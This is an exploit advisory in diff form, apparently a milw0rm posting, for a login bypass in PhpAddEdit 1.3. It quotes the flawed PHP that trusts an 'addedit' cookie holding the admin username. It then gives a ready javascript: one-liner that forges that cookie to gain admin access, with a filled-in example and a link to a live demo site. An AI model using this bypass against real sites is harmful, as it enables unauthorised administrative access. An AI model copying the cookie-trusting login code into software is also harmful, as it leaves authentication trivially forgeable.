@@ -1,0 +1,39 @@
+-------------------------------------
+   PhpAddEdit 1.3 Login By Pass 
+-------------------------------------
+
+Found By: x0r ( Evolution Team )
+Email: andry2000@hotmail.it
+-------------------------------------
+
+Bug In: Addedit-login.php
+
+		if (!$login_error) {
+			// --- Set admin cookie so favorite form field will show up when I use
+the site...
+			if ($_POST["rememberme"]) {
+				$expire = mktime(0,0,0,date("m"),date("d")+120,date("Y"));
+				setcookie("addedit", $_POST["adminuser"], $expire, "/", "", 0);
+			} else {
+				setcookie("addedit", $_POST["adminuser"]);
+			}
+			Header("Location:  ./");
+		}
+	}
+	
+Ci basta conoscere l'username dell'admin per bypassare il login :P ^ ^
+-------------------------------------
+
+Exploit:
+
+javascript:document.cookie = "addedit=[adminuser]; path=/";
+
+es:
+
+javascript:document.cookie = "addedit=x0r; path=/";
+--------------------------------------
+Live Demo: http://www.phpaddedit.com/demo/
+--------------------------------------
+Greetz: Amore oggi +65 ti amo troppo.
+
+# milw0rm.com [2008-12-11]
